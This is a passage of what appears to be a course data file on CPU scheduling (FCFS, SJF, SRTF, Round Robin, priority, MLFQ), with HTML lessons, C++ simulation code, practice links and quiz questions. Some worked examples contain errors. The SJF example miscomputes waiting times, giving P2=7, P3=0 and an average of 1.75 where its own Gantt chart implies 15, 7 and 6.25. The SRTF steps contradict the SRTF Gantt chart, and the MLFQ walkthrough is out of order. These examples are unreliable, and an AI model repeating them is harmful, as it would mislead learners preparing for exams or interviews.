the <b>Convoy Effect</b>: a long CPU-bound process can hold up all shorter processes behind it, dramatically increasing average waiting time. This is a very common interview question!</div><p class="learn-p"><b>Advantages:</b> Simple to implement, fair in order of arrival. <b>Disadvantages:</b> Poor average waiting time, convoy effect, not suitable for interactive systems.</p></div><div class="learn-section"><div class="learn-h">Shortest Job First (SJF) &mdash; Non-Preemptive</div><p class="learn-p"><b>SJF</b> selects the process with the <b>smallest CPU burst time</b> from the ready queue. In the non-preemptive version, once a process starts, it runs to completion.</p><p class="learn-p">SJF is <b>provably optimal</b> for minimizing average waiting time among non-preemptive algorithms.</p><p class="learn-p"><b>Example:</b></p><table class="learn-table"><tr><th>Process</th><th>Arrival Time</th><th>Burst Time</th></tr><tr><td>P1</td><td>0</td><td>6</td></tr><tr><td>P2</td><td>1</td><td>8</td></tr><tr><td>P3</td><td>2</td><td>7</td></tr><tr><td>P4</td><td>3</td><td>3</td></tr></table><p class="learn-p">Gantt chart: <code>|--P1(0-6)--|--P4(6-9)--|--P3(9-16)--|--P2(16-24)--|</code></p><p class="learn-p">At time 0, only P1 is available. At time 6, P2(8), P3(7), P4(3) are ready &mdash; P4 has shortest burst.</p><ul class="learn-list"><li>Waiting Times: P1=0, P2=(16&minus;1)&minus;8=7, P3=(9&minus;2)&minus;7=0, P4=(6&minus;3)&minus;3=0. Avg WT = (0+7+0+0)/4 = <b>1.75</b></li><li>Turnaround: P1=6, P2=23, P3=14, P4=6. Avg TAT = <b>12.25</b></li></ul></div><div class="learn-section"><div class="learn-h">Shortest Remaining Time First (SRTF) &mdash; Preemptive SJF</div><p class="learn-p"><b>SRTF</b> is the preemptive version of SJF. Whenever a new process arrives, the scheduler compares its burst time with the <b>remaining time</b> of the currently running process. If the new process has a shorter remaining time, the current process is preempted.</p><p class="learn-p"><b>Example:</b></p><table class="learn-table"><tr><th>Process</th><th>Arrival Time</th><th>Burst Time</th></tr><tr><td>P1</td><td>0</td><td>8</td></tr><tr><td>P2</td><td>1</td><td>4</td></tr><tr><td>P3</td><td>2</td><td>2</td></tr><tr><td>P4</td><td>3</td><td>1</td></tr></table><p class="learn-p">Gantt chart: <code>|P1(0-1)|P2(1-2)|P3(2-3)|P4(3-4)|P3(4-5)|P2(5-8)|P1(8-15)|</code></p><ul class="learn-list"><li>t=0: P1 starts (remaining=8).</li><li>t=1: P2 arrives (burst=4). P1 remaining=7 &gt; 4 &rarr; <b>P2 preempts P1</b>.</li><li>t=2: P3 arrives (burst=2). P2 remaining=3 &gt; 2 &rarr; <b>P3 preempts P2</b>.</li><li>t=3: P4 arrives (burst=1). P3 remaining=1 = 1 &rarr; tie, P3 continues.</li><li>t=4: P3 completes. Ready: P4(1), P2(rem=3), P1(rem=7). P4 runs (shortest).</li><li>t=5: P4 completes. Ready: P2(rem=3), P1(rem=7). P2 runs.</li><li>t=8: P2 completes. P1 runs.</li><li>t=15: P1 completes.</li></ul><ul class="learn-list"><li>Waiting Times: P1=(15&minus;0)&minus;8=7, P2=(8&minus;1)&minus;4=3, P3=(5&minus;2)&minus;2=1, P4=(5&minus;3)&minus;1=1. Avg WT = (7+3+1+1)/4 = <b>3.0</b></li><li>Turnaround: P1=15, P2=7, P3=3, P4=2. Avg TAT = <b>6.75</b></li></ul><div class="learn-tip"><b>Key:</b> Notice P2 preempted P1 at t=1, then P3 preempted P2 at t=2 &mdash; this is what makes SRTF different from non-preemptive SJF. SRTF gives the best possible average waiting time overall.</div><div class="learn-tip"><b>Tip:</b> The main limitation of SJF/SRTF is that the CPU burst time must be <b>known in advance</b>, which is often impossible. In practice, it is estimated using <b>exponential averaging</b>: &tau;<sub>n+1</sub> = &alpha; &middot; t<sub>n</sub> + (1 - &alpha;) &middot; &tau;<sub>n</sub>, where t<sub>n</sub> is the actual burst of the nth run and &alpha; is typically 0.5.</div></div><div class="learn-section"><div class="learn-h">Starvation in SJF</div><p class="learn-p">SJF can cause <b>starvation</b>: long processes may never execute if short processes keep arriving. The solution is <b>aging</b> &mdash; gradually increasing the priority of waiting processes over time.</p><div class="learn-warn"><b>Warning:</b> In interviews, always mention starvation as the main disadvantage of SJF and aging as the solution.</div></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Variant</th><th>Preemptive?</th><th>Selection Criterion</th><th>Starvation?</th></tr><tr><td>FCFS</td><td>No</td><td>Arrival order</td><td>No</td></tr><tr><td>SJF (Non-preemptive)</td><td>No</td><td>Shortest burst (available)</td><td>Yes</td></tr><tr><td>SRTF (Preemptive SJF)</td><td>Yes</td><td>Shortest remaining time</td><td>Yes</td></tr><tr><td>HRRN</td><td>No</td><td>Highest Response Ratio = (WT + BT) / BT</td><td>No</td></tr></table><p class="learn-p"><b>Highest Response Ratio Next (HRRN)</b> favors shorter jobs but also considers waiting time, preventing starvation. The response ratio naturally increases for waiting processes.</p></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>FCFS is NOT always bad:</b> For batch jobs with similar burst times, FCFS is simple, fair, and has negligible overhead.</li><li><b>SJF requires future knowledge:</b> In practice, burst times are unknown. Exponential averaging is an approximation.</li><li><b>SRTF tie-breaking matters:</b> Most implementations prefer the currently running process to avoid unnecessary context switches.</li><li><b>Starvation in SJF is real:</b> In heavily loaded systems where short jobs continuously arrive, a long job may NEVER execute. Aging is the solution.</li><li><b>SJF optimal only for non-preemptive avg WT:</b> SRTF is optimal for overall average WT.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Algorithm</th><th>Scheduling Overhead</th><th>Avg Waiting Time</th><th>Context Switches</th></tr><tr><td>FCFS</td><td><span class="learn-complexity">O(1)</span></td><td>High (convoy effect)</td><td>Minimal (n-1)</td></tr><tr><td>SJF</td><td><span class="learn-complexity">O(n) per decision</span></td><td>Optimal (non-preemptive)</td><td>Minimal (n-1)</td></tr><tr><td>SRTF</td><td><span class="learn-complexity">O(n) per arrival</span></td><td>Optimal (overall)</td><td>Higher (preemption)</td></tr></table><p class="learn-p">Using a min-heap, SJF/SRTF selection can be done in O(log n) instead of O(n).</p></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Why is SJF considered optimal for average waiting time?</b><br>A: SJF minimizes average WT because executing shorter jobs first reduces cumulative waiting of subsequent jobs. Proven by exchange argument: swapping a shorter job ahead of a longer one never increases total WT.</p><p class="learn-p"><b>Q2: What is the convoy effect?</b><br>A: In FCFS, a long CPU-burst process holds the CPU while many shorter processes queue behind it. All short processes experience inflated waiting times.</p><p class="learn-p"><b>Q3: How does exponential averaging predict CPU burst times?</b><br>A: The formula tau(n+1) = alpha * t(n) + (1-alpha) * tau(n) weights recent actual bursts against historical predictions. Typically alpha = 0.5. Older observations have exponentially decreasing influence.</p><p class="learn-p"><b>Q4: How would you prevent starvation in SJF?</b><br>A: Use <b>aging</b>: periodically decrease the effective burst time estimate of waiting processes. HRRN achieves this naturally through its response ratio formula.</p><p class="learn-p"><b>Q5: Can FCFS outperform SJF?</b><br>A: If all processes have identical burst times, FCFS and SJF produce the same result. Also, if burst predictions are inaccurate, FCFS may perform better since it has zero scheduling overhead.</p></div>',

          code: `// FCFS and SJF (Non-Preemptive) CPU Scheduling in C++
#include <iostream>
#include <vector>
#include <algorithm>
#include <iomanip>
#include <climits>
using namespace std;

struct Process {
    int id, arrival, burst;
    int completion, turnaround, waiting;
};

// First Come First Served
void fcfs(vector<Process> procs) {
    sort(procs.begin(), procs.end(), [](const Process &a, const Process &b) {
        return a.arrival < b.arrival;
    });

    int currentTime = 0;
    double totalWT = 0, totalTAT = 0;
    int n = procs.size();

    cout << "=== FCFS Scheduling ===" << endl;
    for (auto &p : procs) {
        if (currentTime < p.arrival) currentTime = p.arrival;
        p.completion = currentTime + p.burst;
        p.turnaround = p.completion - p.arrival;
        p.waiting = p.turnaround - p.burst;
        currentTime = p.completion;
        totalWT += p.waiting;
        totalTAT += p.turnaround;
    }

    cout << "PID\\tAT\\tBT\\tCT\\tTAT\\tWT" << endl;
    for (auto &p : procs) {
        cout << "P" << p.id << "\\t" << p.arrival << "\\t" << p.burst
             << "\\t" << p.completion << "\\t" << p.turnaround
             << "\\t" << p.waiting << endl;
    }
    cout << fixed << setprecision(2);
    cout << "Avg TAT = " << totalTAT / n
         << ", Avg WT = " << totalWT / n << endl;
}

// Shortest Job First (Non-Preemptive)
void sjfNonPreemptive(vector<Process> procs) {
    int n = procs.size();
    vector<bool> done(n, false);
    int currentTime = 0, completed = 0;
    double totalWT = 0, totalTAT = 0;

    cout << "\\n=== SJF Non-Preemptive Scheduling ===" << endl;

    while (completed < n) {
        int idx = -1, minBurst = INT_MAX;
        for (int i = 0; i < n; i++) {
            if (!done[i] && procs[i].arrival <= currentTime
                && procs[i].burst < minBurst) {
                minBurst = procs[i].burst;
                idx = i;
            }
        }
        if (idx == -1) {
            currentTime++;
            continue;
        }
        procs[idx].completion = currentTime + procs[idx].burst;
        procs[idx].turnaround = procs[idx].completion - procs[idx].arrival;
        procs[idx].waiting = procs[idx].turnaround - procs[idx].burst;
        currentTime = procs[idx].completion;
        totalWT += procs[idx].waiting;
        totalTAT += procs[idx].turnaround;
        done[idx] = true;
        completed++;
    }

    cout << "PID\\tAT\\tBT\\tCT\\tTAT\\tWT" << endl;
    for (auto &p : procs) {
        cout << "P" << p.id << "\\t" << p.arrival << "\\t" << p.burst
             << "\\t" << p.completion << "\\t" << p.turnaround
             << "\\t" << p.waiting << endl;
    }
    cout << fixed << setprecision(2);
    cout << "Avg TAT = " << totalTAT / n
         << ", Avg WT = " << totalWT / n << endl;
}

int main() {
    vector<Process> procs = {
        {1, 0, 6, 0, 0, 0},
        {2, 1, 8, 0, 0, 0},
        {3, 2, 7, 0, 0, 0},
        {4, 3, 3, 0, 0, 0}
    };
    fcfs(procs);
    sjfNonPreemptive(procs);
    return 0;
}`,
          problems: [
            ['FCFS Scheduling', 'https://www.geeksforgeeks.org/program-for-fcfs-cpu-scheduling-set-1/', 'Easy'],
            ['SJF Scheduling', 'https://www.geeksforgeeks.org/program-for-shortest-job-first-or-sjf-cpu-scheduling-set-1-non-preemptive/', 'Medium'],
            ['SRTF (Preemptive SJF)', 'https://www.geeksforgeeks.org/program-for-shortest-job-first-sjf-scheduling-set-2-preemptive/', 'Medium'],
            ['Starvation and Aging in OS', 'https://www.geeksforgeeks.org/starvation-and-aging-in-operating-systems/', 'Easy'],
            ['CPU Scheduling Algorithms', 'https://www.geeksforgeeks.org/cpu-scheduling-in-operating-systems/', 'Medium'],
          ],
          mcqs: [
            {q: 'Which non-preemptive scheduling algorithm is provably optimal for minimizing average waiting time?', o: ['FCFS', 'SJF', 'Round Robin', 'Priority Scheduling'], a: 1},
            {q: 'What is the Convoy Effect?', o: ['Short processes wait behind a long process in FCFS', 'Multiple processes terminate simultaneously', 'Priority inversion in real-time systems', 'Deadlock caused by circular wait'], a: 0},
            {q: 'How is the CPU burst time typically predicted in SJF?', o: ['It is always known in advance', 'Using exponential averaging of past bursts', 'By measuring the process size on disk', 'By counting the number of instructions'], a: 1},
            {q: 'In SRTF, when is the currently running process preempted?', o: ['When a higher priority process arrives', 'When a new process with shorter remaining burst arrives', 'When its time quantum expires', 'When it performs I/O'], a: 1},
            {q: 'FCFS scheduling is always:', o: ['Preemptive', 'Non-preemptive', 'Priority-based', 'Optimal for average waiting time'], a: 1},
            {q: 'What is the main disadvantage of SJF scheduling?', o: ['High context switch overhead', 'Convoy effect', 'Starvation of long processes', 'Poor response time for all processes'], a: 2},
          ],
        },
        // ----- Topic 1: Round Robin & Priority Scheduling -----
        {
          t: 'Round Robin & Priority Scheduling',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">When you interact with your computer, clicking a button should feel immediate even while a background compilation runs. Round Robin guarantees bounded response time by giving each process a fair time slice. Priority scheduling ensures critical tasks get CPU before less urgent work. Together they form the basis of modern interactive OS schedulers.</p></div><div class="learn-section"><div class="learn-h">Round Robin (RR) Scheduling</div><p class="learn-p"><b>Round Robin</b> is the most widely used scheduling algorithm in time-sharing systems. Each process is assigned a fixed <b>time quantum (q)</b>. Processes are kept in a circular FIFO queue. The CPU scheduler picks the first process, sets a timer for q time units, and lets it run. If the process finishes before q, it releases the CPU voluntarily. If it doesn\'t finish, a timer interrupt preempts it and it goes to the back of the ready queue.</p><p class="learn-p"><b>Example:</b> Time quantum q = 4</p><table class="learn-table"><tr><th>Process</th><th>Arrival Time</th><th>Burst Time</th></tr><tr><td>P1</td><td>0</td><td>10</td></tr><tr><td>P2</td><td>1</td><td>4</td></tr><tr><td>P3</td><td>2</td><td>5</td></tr></table><p class="learn-p">Gantt chart: <code>|P1(0-4)|P2(4-8)|P3(8-12)|P1(12-16)|P3(16-17)|P1(17-19)|</code></p><ul class="learn-list"><li>t=0: P1 runs for 4 units (remaining=6). At t=1, P2 arrives; at t=2, P3 arrives.</li><li>t=4: P2 runs for 4 units (completes). Queue: [P3, P1].</li><li>t=8: P3 runs for 4 units (remaining=1). Queue: [P1, P3].</li><li>t=12: P1 runs for 4 units (remaining=2). Queue: [P3, P1].</li><li>t=16: P3 runs for 1 unit (completes). Queue: [P1].</li><li>t=17: P1 runs for 2 units (completes).</li></ul><ul class="learn-list"><li>Waiting Times: P1=(19&minus;0)&minus;10=9, P2=(8&minus;1)&minus;4=3, P3=(17&minus;2)&minus;5=10. Avg WT = (9+3+10)/3 = <b>7.33</b></li><li>Turnaround: P1=19, P2=7, P3=15. Avg TAT = (19+7+15)/3 = <b>13.67</b></li></ul></div><div class="learn-section"><div class="learn-h">Effect of Time Quantum</div><p class="learn-p">The choice of time quantum <b>q</b> significantly impacts performance:</p><ul class="learn-list"><li><b>If q is very large</b> (larger than the longest burst): RR degenerates to <b>FCFS</b>.</li><li><b>If q is very small</b> (approaching 0): Very high context switch overhead, most CPU time is spent switching rather than executing processes (called <b>processor sharing</b>).</li></ul><p class="learn-p">A <b>rule of thumb</b>: q should be large enough that 80% of CPU bursts are shorter than q. Typical values are 10&ndash;100 milliseconds.</p><div class="learn-tip"><b>Tip:</b> RR gives excellent <b>response time</b> (important for interactive systems) but can have higher <b>turnaround time</b> than SJF. It provides fairness &mdash; no starvation occurs.</div><p class="learn-p"><b>Advantages:</b> Fair, no starvation, good response time. <b>Disadvantages:</b> Higher average TAT than SJF, performance depends heavily on quantum size, more context switches.</p></div><div class="learn-section"><div class="learn-h">Priority Scheduling</div><p class="learn-p">In <b>Priority Scheduling</b>, each process is assigned a priority, and the CPU is allocated to the process with the <b>highest priority</b> (lowest number = highest priority in many systems). It can be either <b>preemptive</b> or <b>non-preemptive</b>.</p><p class="learn-p"><b>Example (Non-Preemptive):</b></p><table class="learn-table"><tr><th>Process</th><th>Arrival</th><th>Burst</th><th>Priority</th></tr><tr><td>P1</td><td>0</td><td>10</td><td>3</td></tr><tr><td>P2</td><td>0</td><td>1</td><td>1</td></tr><tr><td>P3</td><td>0</td><td>2</td><td>4</td></tr><tr><td>P4</td><td>0</td><td>1</td><td>5</td></tr><tr><td>P5</td><td>0</td><td>5</td><td>2</td></tr></table><p class="learn-p">Execution order: P2(1) &rarr; P5(5) &rarr; P1(10) &rarr; P3(2) &rarr; P4(1)</p><p class="learn-p">Average WT = (6+0+16+18+1)/5 = <b>8.2</b></p></div><div class="learn-section"><div class="learn-h">Starvation and Aging</div><p class="learn-p"><b>Starvation</b> is the major problem with priority scheduling: low-priority processes may <b>never execute</b> if higher-priority processes keep arriving.</p><p class="learn-p"><b>Aging</b> is the solution: gradually <b>increase the priority</b> of processes that have been waiting in the ready queue for a long time. For example, increase priority by 1 every 15 minutes.</p><div class="learn-warn"><b>Warning:</b> Priority inversion is a related problem where a high-priority process is indirectly blocked by a low-priority process holding a needed resource. The Mars Pathfinder incident (1997) is a famous real-world example. Solutions include <b>priority inheritance</b> (temporarily raise the lock-holder\'s priority to that of the highest-priority waiter) and <b>priority ceiling protocol</b> (each mutex is assigned the priority of the highest-priority task that may lock it; a task\'s effective priority is raised to the mutex\'s ceiling when it acquires the lock, preventing intermediate-priority tasks from preempting it).</div></div><div class="learn-section"><div class="learn-h">Combining Priority with Round Robin</div><p class="learn-p">A practical approach used in real systems: Use <b>priority scheduling between queues</b> and <b>Round Robin within each priority level</b>. This way, processes with the same priority share the CPU fairly, and higher-priority processes get preference.</p><div class="learn-tip"><b>Tip:</b> In interviews, be prepared to compare algorithms. RR is best for response time, SJF for turnaround time, and Priority scheduling for systems with clear task importance levels.</div></div><div class="learn-section"><div class="learn-h">Patterns &amp; Variations</div><table class="learn-table"><tr><th>Variant</th><th>Description</th><th>Advantage</th></tr><tr><td>Basic Round Robin</td><td>Fixed quantum, FIFO queue</td><td>Simple, fair, bounded response</td></tr><tr><td>Weighted Round Robin</td><td>Quantum proportional to weight/priority</td><td>Differentiated service</td></tr><tr><td>Preemptive Priority</td><td>Running process preempted if higher-priority arrives</td><td>Fastest response for high-priority</td></tr><tr><td>Non-preemptive Priority</td><td>Running process completes first</td><td>Fewer context switches</td></tr><tr><td>Priority + RR</td><td>Priority between queues, RR within same priority</td><td>Best of both</td></tr></table><p class="learn-p"><b>Priority Inversion</b> occurs when a high-priority task is blocked by a low-priority task holding a shared resource. Solutions: <b>Priority Inheritance</b> and <b>Priority Ceiling</b>.</p></div><div class="learn-section"><div class="learn-h">Pitfalls &amp; Edge Cases</div><ul class="learn-list"><li><b>Quantum too small:</b> Context switch overhead dominates. If a switch takes 5 &mu;s and quantum is 10 &mu;s, 33% of CPU time is wasted.</li><li><b>Quantum too large:</b> RR degenerates to FCFS.</li><li><b>Priority scheduling without aging = starvation:</b> Low-priority processes can starve indefinitely.</li><li><b>Priority inversion is real:</b> The Mars Pathfinder (1997) experienced priority inversion causing system resets. Fix: priority inheritance.</li><li><b>RR with I/O-bound processes:</b> I/O-bound processes often don\'t use their full quantum but go to the back of the queue. MLFQ solves this.</li></ul></div><div class="learn-section"><div class="learn-h">Complexity &amp; Comparison</div><table class="learn-table"><tr><th>Algorithm</th><th>Response Time</th><th>Turnaround</th><th>Context Switches</th><th>Implementation</th></tr><tr><td>RR (small q)</td><td>Excellent</td><td>Poor</td><td>Very high</td><td>Circular FIFO, O(1)</td></tr><tr><td>RR (large q)</td><td>Poor (approaches FCFS)</td><td>Fair</td><td>Low</td><td>Circular FIFO, O(1)</td></tr><tr><td>Priority (Preemptive)</td><td>Best for high-priority</td><td>Variable</td><td>Medium</td><td>Priority queue, O(log n)</td></tr></table></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: How do you choose the right time quantum for Round Robin?</b><br>A: The quantum should be large enough that 80% of CPU bursts complete within one quantum. Typical values: 10-100 ms. Heuristic: quantum should be at least 10x the context switch time.</p><p class="learn-p"><b>Q2: What is the Mars Pathfinder priority inversion bug?</b><br>A: A high-priority meteorological task was blocked waiting for a mutex held by a low-priority information bus task. A medium-priority communications task kept preempting the low-priority task. Fix: priority inheritance in VxWorks RTOS.</p><p class="learn-p"><b>Q3: Compare RR and SJF for an interactive system.</b><br>A: RR provides bounded response time (at most (n-1)*q). SJF minimizes average waiting time but has unbounded response for long jobs. For interactive use, response time matters more.</p><p class="learn-p"><b>Q4: What is priority inheritance?</b><br>A: When a high-priority thread is blocked on a lock held by a low-priority thread, the low-priority thread\'s priority is temporarily raised to prevent medium-priority threads from preempting it.</p><p class="learn-p"><b>Q5: Does Round Robin cause starvation?</b><br>A: No. Every process gets at least q time units within every cycle of (n*q) time units, so all processes make progress.</p></div>',

          code: `// Round Robin and Priority Scheduling in C++
#include <iostream>
#include <vector>
#include <queue>
#include <algorithm>
#include <iomanip>
#include <climits>
using namespace std;

struct Process {
    int id, arrival, burst, priority;
    int remaining, completion, turnaround, waiting, responseTime;
    bool started;
};

// Round Robin Scheduling
void roundRobin(vector<Process> procs, int quantum) {
    int n = procs.size();
    sort(procs.begin(), procs.end(), [](const Process &a, const Process &b) {
        return a.arrival < b.arrival;
    });
    for (auto &p : procs) { p.remaining = p.burst; p.started = false; }

    queue<int> readyQ;
    int currentTime = 0, completed = 0, idx = 0;
    double totalWT = 0, totalTAT = 0;

    // Add first process
    if (idx < n) { readyQ.push(idx); idx++; }

    cout << "=== Round Robin (q=" << quantum << ") ===" << endl;
    cout << "Gantt: ";

    while (completed < n) {
        if (readyQ.empty()) {
            currentTime = procs[idx].arrival;
            readyQ.push(idx); idx++;
        }
        int i = readyQ.front(); readyQ.pop();

        if (!procs[i].started) {
            procs[i].responseTime = currentTime - procs[i].arrival;
            procs[i].started = true;
        }

        int execTime = min(quantum, procs[i].remaining);
        cout << "P" << procs[i].id << "(" << currentTime << "-"
             << currentTime + execTime << ") ";
        currentTime += execTime;
        procs[i].remaining -= execTime;

        // Add newly arrived processes to ready queue
        while (idx < n && procs[idx].arrival <= currentTime) {
            readyQ.push(idx); idx++;
        }

        if (procs[i].remaining > 0) {
            readyQ.push(i); // Put back in queue
        } else {
            procs[i].completion = currentTime;
            procs[i].turnaround = procs[i].completion - procs[i].arrival;
            procs[i].waiting = procs[i].turnaround - procs[i].burst;
            totalWT += procs[i].waiting;
            totalTAT += procs[i].turnaround;
            completed++;
        }
    }

    cout << endl;
    cout << "PID\\tAT\\tBT\\tCT\\tTAT\\tWT\\tRT" << endl;
    for (auto &p : procs) {
        cout << "P" << p.id << "\\t" << p.arrival << "\\t" << p.burst
             << "\\t" << p.completion << "\\t" << p.turnaround
             << "\\t" << p.waiting << "\\t" << p.responseTime << endl;
    }
    cout << fixed << setprecision(2);
    cout << "Avg TAT=" << totalTAT/n << ", Avg WT=" << totalWT/n << endl;
}

// Priority Scheduling (Non-Preemptive, lower number = higher priority)
void priorityScheduling(vector<Process> procs) {
    int n = procs.size();
    vector<bool> done(n, false);
    int currentTime = 0, completed = 0;
    double totalWT = 0, totalTAT = 0;

    cout << "\\n=== Priority Scheduling (Non-Preemptive) ===" << endl;

    while (completed < n) {
        int idx = -1, highestPri = INT_MAX;
        for (int i = 0; i < n; i++) {
            if (!done[i] && procs[i].arrival <= currentTime
                && procs[i].priority < highestPri) {
                highestPri = procs[i].priority;
                idx = i;
            }
        }
        if (idx == -1) { currentTime++; continue; }

        procs[idx].completion = currentTime + procs[idx].burst;
        procs[idx].turnaround = procs[idx].completion - procs[idx].arrival;
        procs[idx].waiting = procs[idx].turnaround - procs[idx].burst;
        currentTime = procs[idx].completion;
        totalWT += procs[idx].waiting;
        totalTAT += procs[idx].turnaround;
        done[idx] = true;
        completed++;
    }

    cout << "PID\\tAT\\tBT\\tPri\\tCT\\tTAT\\tWT" << endl;
    for (auto &p : procs) {
        cout << "P" << p.id << "\\t" << p.arrival << "\\t" << p.burst
             << "\\t" << p.priority << "\\t" << p.completion
             << "\\t" << p.turnaround << "\\t" << p.waiting << endl;
    }
    cout << fixed << setprecision(2);
    cout << "Avg TAT=" << totalTAT/n << ", Avg WT=" << totalWT/n << endl;
}

int main() {
    vector<Process> procs = {
        {1, 0, 10, 3, 0,0,0,0,0,false},
        {2, 1, 4,  1, 0,0,0,0,0,false},
        {3, 2, 5,  4, 0,0,0,0,0,false},
        {4, 3, 2,  2, 0,0,0,0,0,false}
    };
    roundRobin(procs, 4);
    priorityScheduling(procs);
    return 0;
}`,
          problems: [
            ['Round Robin Scheduling', 'https://www.geeksforgeeks.org/program-for-round-robin-scheduling-for-the-same-arrival-time/', 'Medium'],
            ['Priority Scheduling', 'https://www.geeksforgeeks.org/program-for-priority-cpu-scheduling-set-1/', 'Medium'],
            ['Preemptive Priority Scheduling', 'https://www.geeksforgeeks.org/preemptive-priority-cpu-scheduling-algortithm/', 'Hard'],
            ['Priority Inversion Problem', 'https://www.geeksforgeeks.org/priority-inversion-what-the-heck/', 'Hard'],
          ],
          mcqs: [
            {q: 'If the time quantum in Round Robin is set very large, it behaves like:', o: ['SJF', 'FCFS', 'Priority Scheduling', 'SRTF'], a: 1},
            {q: 'What technique is used to prevent starvation in priority scheduling?', o: ['Aging', 'Paging', 'Swapping', 'Thrashing'], a: 0},
            {q: 'Which scheduling algorithm provides the best average response time for interactive systems?', o: ['FCFS', 'SJF', 'Round Robin', 'Priority (Non-Preemptive)'], a: 2},
            {q: 'What is priority inversion?', o: ['A high-priority process waits for a low-priority process holding a needed resource', 'A low-priority process preempts a high-priority process', 'Priority values are reversed by the scheduler', 'Aging increases priority beyond the maximum value'], a: 0},
            {q: 'In Round Robin, what happens when a process completes before its time quantum expires?', o: ['The CPU idles until the quantum expires', 'The process moves to the back of the queue', 'The CPU immediately schedules the next process', 'The remaining quantum is given to the next process'], a: 2},
            {q: 'Which approach combines priority scheduling with fairness among equal-priority processes?', o: ['Multilevel queue with RR within levels', 'SJF with aging', 'FCFS with priority boost', 'SRTF with time quantum'], a: 0},
          ],
        },
        // ----- Topic 2: MLFQ & Comparison of Algorithms -----
        {
          t: 'MLFQ & Comparison of Algorithms',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Real operating systems must handle diverse workloads simultaneously: interactive text editors, batch compilation jobs, and I/O-heavy database queries. MLFQ adapts dynamically by observing process behavior, automatically favoring interactive processes while ensuring batch jobs eventually complete. Most modern OSes use MLFQ or related adaptive schedulers (Linux CFS is a notable exception &mdash; it uses proportional fair-share scheduling instead).</p></div><div class="learn-section"><div class="learn-h">Multilevel Queue Scheduling</div><p class="learn-p">In <b>Multilevel Queue Scheduling</b>, the ready queue is partitioned into several separate queues, each with its own scheduling algorithm. Processes are permanently assigned to one queue based on their type (e.g., foreground/interactive vs. background/batch).</p><p class="learn-p">Common configuration:</p><ul class="learn-list"><li><b>Queue 1 (Highest Priority):</b> System processes &mdash; FCFS or Priority</li><li><b>Queue 2:</b> Interactive processes &mdash; Round Robin</li><li><b>Queue 3 (Lowest Priority):</b> Batch processes &mdash; FCFS</li></ul><p class="learn-p">Scheduling between queues is typically <b>fixed priority preemptive</b>: a process in a lower-priority queue will only run if all higher-priority queues are empty. Alternatively, <b>time slicing</b> can be used: each queue gets a certain percentage of CPU time (e.g., 80% to foreground, 20% to background).</p><div class="learn-warn"><b>Warning:</b> In simple multilevel queue scheduling, a process cannot move between queues. This means an I/O-bound process that becomes CPU-bound is stuck in its original queue. This inflexibility is addressed by MLFQ.</div></div><div class="learn-section"><div class="learn-h">Multilevel Feedback Queue (MLFQ)</div><p class="learn-p"><b>MLFQ</b> is the most general and sophisticated CPU scheduling algorithm. Unlike the multilevel queue, processes can <b>move between queues</b> based on their behavior. The key rules are:</p><ol class="learn-list"><li><b>Rule 1:</b> If Priority(A) &gt; Priority(B), A runs.</li><li><b>Rule 2:</b> If Priority(A) = Priority(B), A and B run in Round Robin.</li><li><b>Rule 3:</b> When a new job enters the system, it is placed at the <b>highest priority</b> queue.</li><li><b>Rule 4a:</b> If a job uses up its entire time quantum, its priority is <b>reduced</b> (moved to a lower queue).</li><li><b>Rule 4b:</b> If a job gives up the CPU before the time quantum expires (e.g., for I/O), it stays at the <b>same priority level</b>.</li><li><b>Rule 5 (Priority Boost):</b> Periodically, move all jobs to the highest priority queue to prevent starvation.</li></ol><div class="learn-tip"><b>Tip:</b> MLFQ favors interactive (I/O-bound) processes because they frequently give up the CPU before their quantum expires and thus stay in high-priority queues. CPU-bound processes naturally sink to lower-priority queues.</div><p class="learn-p"><b>Typical MLFQ configuration:</b></p><table class="learn-table"><tr><th>Queue</th><th>Priority</th><th>Time Quantum</th><th>Algorithm</th></tr><tr><td>Q0</td><td>Highest</td><td>8 ms</td><td>Round Robin</td></tr><tr><td>Q1</td><td>Medium</td><td>16 ms</td><td>Round Robin</td></tr><tr><td>Q2</td><td>Lowest</td><td>&infin;</td><td>FCFS</td></tr></table><p class="learn-p">A new process enters Q0. If it doesn\'t finish within 8ms, it moves to Q1. If it doesn\'t finish within 16ms in Q1, it moves to Q2.</p><p class="learn-p"><b>MLFQ Walkthrough:</b> Consider two processes: A (CPU-bound, burst=30ms) and B (interactive, burst=3ms arriving at t=5).</p><ul class="learn-list"><li>t=0: A enters Q0, runs for 8ms quantum.</li><li>t=8: A used full quantum &rarr; demoted to Q1. No other process ready, A runs in Q1 (quantum=16ms).</li><li>t=5 (during A\'s Q0 run): B enters Q0 and <b>preempts A</b> (Q0 &gt; Q1). B runs for 3ms and completes. A resumes.</li><li>t=24: A used full Q1 quantum &rarr; demoted to Q2 (FCFS). A runs until complete at t=30.</li></ul><p class="learn-p">Result: B (interactive) got immediate service in Q0, while A (CPU-bound) gradually sank to Q2 &mdash; MLFQ automatically classified them without knowing burst times.</p></div><div class="learn-section"><div class="learn-h">Gaming the MLFQ</div><p class="learn-p">A malicious process could <b>game the scheduler</b> by issuing a fake I/O request just before its time quantum expires, thereby staying at a high priority. The <b>solution</b>: instead of resetting the time quota when a process gives up the CPU, <b>accumulate</b> the time used. Once a process has used its total allotment at a given level, demote it regardless of how many times it gave up the CPU.</p></div><div class="learn-section"><div class="learn-h">Comparison of All Scheduling Algorithms</div><table class="learn-table"><tr><th>Algorithm</th><th>Preemptive?</th><th>Starvation?</th><th>Optimal WT?</th><th>Best For</th></tr><tr><td>FCFS</td><td>No</td><td>No</td><td>No</td><td>Batch systems</td></tr><tr><td>SJF</td><td>No</td><td>Yes</td><td>Yes (non-preemptive)</td><td>Batch with known burst times</td></tr><tr><td>SRTF</td><td>Yes</td><td>Yes</td><td>Yes (overall)</td><td>Minimal avg. wait time</td></tr><tr><td>Round Robin</td><td>Yes</td><td>No</td><td>No</td><td>Interactive/time-sharing</td></tr><tr><td>Priority</td><td>Both</td><td>Yes</td><td>No</td><td>Systems with task importance</td></tr><tr><td>MLFQ</td><td>Yes</td><td>No (with 